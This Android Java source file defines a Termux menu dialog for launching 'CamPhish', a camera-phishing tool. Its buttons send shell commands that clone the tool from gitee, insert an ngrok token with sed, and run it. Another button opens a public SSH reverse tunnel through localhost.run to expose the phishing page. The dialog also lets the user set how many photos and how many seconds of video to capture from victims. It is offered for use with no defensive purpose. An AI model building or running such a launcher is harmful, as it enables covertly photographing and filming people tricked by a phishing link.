package com.termux.menu.ui.dialog;

import android.app.Dialog;
import android.content.Context;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Build;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import com.termux.menu.termux.TermuxCommandHelper;

/** CamPhish 摄像头钓鱼 — 对齐 ZeroTermux-main CamphishDialog */
public class CamphishDialog extends Dialog {
    private Context mContext;
    private TermuxCommandHelper mCmdHelper;
    private EditText mTokenEdit, mPhotoCountEdit, mVideoSecEdit;

    public CamphishDialog(Context context) {
        super(context);
        mContext = context;
        mCmdHelper = TermuxCommandHelper.getInstance(context);
        init();
    }

    private void init() {
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        setCancelable(true);
        ScrollView scroll = new ScrollView(mContext);
        LinearLayout root = new LinearLayout(mContext);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF161823);
        root.setPadding(dp(20), dp(16), dp(20), dp(16));

        addTitle(root, "CamPhish 摄像头钓鱼");

        root.addView(label("Ngrok AuthToken:"));
        mTokenEdit = editText("");
        mTokenEdit.setHint("从 https://dashboard.ngrok.com 获取");
        root.addView(mTokenEdit);

        root.addView(label("拍照数量:"));
        mPhotoCountEdit = editText("2");
        root.addView(mPhotoCountEdit);

        root.addView(label("录像秒数:"));
        mVideoSecEdit = editText("3");
        root.addView(mVideoSecEdit);

        TextView note = new TextView(mContext);
        note.setText("首次使用会自动从gitee克隆CamPhish工具(约80MB)");
        note.setTextColor(0xFF888888); note.setTextSize(11);
        note.setPadding(0, dp(8), 0, dp(8));
        root.addView(note);

        LinearLayout btnRow = new LinearLayout(mContext);
        btnRow.setPadding(0, dp(12), 0, 0);

        Button startBtn = btn("启动", 0xFF4CAF50);
        startBtn.setOnClickListener(new View.OnClickListener() { public void onClick(View v) { startCamphish(); }});
        btnRow.addView(startBtn);

        Button updateBtn = btn("更新", 0xFFFF9800);
        updateBtn.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
            mCmdHelper.sendCommandToTerminal("cd /usr/share/camphish && git pull 2>/dev/null || echo '更新失败'");
            Toast.makeText(mContext, "正在更新CamPhish...", Toast.LENGTH_SHORT).show();
            dismiss();
        }});
        btnRow.addView(updateBtn);

        Button stopBtn = btn("停止", 0xFFF44336);
        stopBtn.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
            mCmdHelper.sendCommandToTerminal("pkill -f camphish; pkill -f 'python.*camphish'");
            Toast.makeText(mContext, "已停止CamPhish", Toast.LENGTH_SHORT).show();
        }});
        btnRow.addView(stopBtn);

        Button tunnelBtn = btn("隧道启动", 0xFF2196F3);
        tunnelBtn.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
            mCmdHelper.sendCommandToTerminal("ssh -R 80:localhost:8080 nokey@localhost.run");
            Toast.makeText(mContext, "隧道已启动", Toast.LENGTH_SHORT).show();
            dismiss();
        }});
        btnRow.addView(tunnelBtn);

        root.addView(btnRow);
        scroll.addView(root);
        setContentView(scroll);
        setupWindow();
    }

    private void startCamphish() {
        String token = mTokenEdit.getText().toString().trim();
        String photos = mPhotoCountEdit.getText().toString().trim();
        String videoSec = mVideoSecEdit.getText().toString().trim();
        if (photos.isEmpty()) photos = "2";
        if (videoSec.isEmpty()) videoSec = "3";

        StringBuilder cmd = new StringBuilder();
        cmd.append("if [ ! -d /usr/share/camphish ]; then ");
        cmd.append("cd /usr/share && git clone https://gitee.com/skilfulwriter/CamPhish.git camphish 2>/dev/null; fi; ");

        if (!token.isEmpty()) {
            cmd.append("sed -i 's/YOUR_NGROK_AUTH_TOKEN/").append(token).append("/g' /usr/share/camphish/main.py 2>/dev/null; ");
        }
        cmd.append("cd /usr/share/camphish && python main.py");

        mCmdHelper.sendCommandToTerminal(cmd.toString());
        Toast.makeText(mContext, "CamPhish已启动", Toast.LENGTH_SHORT).show();
        dismiss();
    }

    private void addTitle(LinearLayout r, String t) { TextView tv=new TextView(mContext); tv.setText(t); tv.setTextColor(0xFFFFFFFF); tv.setTextSize(18); tv.setPadding(0,0,0,dp(12)); r.addView(tv); }
    private void setupWindow() { Window w=getWindow(); if(w!=null){w.setGravity(Gravity.BOTTOM); w.setLayout(ViewGroup.LayoutParams.MATCH_PARENT,(int)(mContext.getResources().getDisplayMetrics().heightPixels*0.7)); w.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT)); if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.O)w.setType(WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY);else w.setType(WindowManager.LayoutParams.TYPE_PHONE);}}
    private TextView label(String t){TextView tv=new TextView(mContext);tv.setText(t);tv.setTextColor(0xFFBBBBBB);tv.setTextSize(13);tv.setPadding(0,dp(10),0,dp(4));return tv;}
    private EditText editText(String d){EditText et=new EditText(mContext);et.setText(d);et.setTextColor(0xFFFFFFFF);et.setHintTextColor(0xFF888888);et.setBackgroundColor(0x22FFFFFF);et.setPadding(dp(12),dp(8),dp(12),dp(8));et.setSingleLine(true);et.setTextSize(14);return et;}
    private Button btn(String t,int c){Button b=new Button(mContext);b.setText(t);b.setTextColor(0xFFFFFFFF);b.setBackgroundColor(c);LinearLayout.LayoutParams p=new LinearLayout.LayoutParams(0,ViewGroup.LayoutParams.WRAP_CONTENT,1);p.rightMargin=dp(6);b.setLayoutParams(p);return b;}
    private int dp(int v){return (int)(v*mContext.getResources().getDisplayMetrics().density+0.5f);}
}
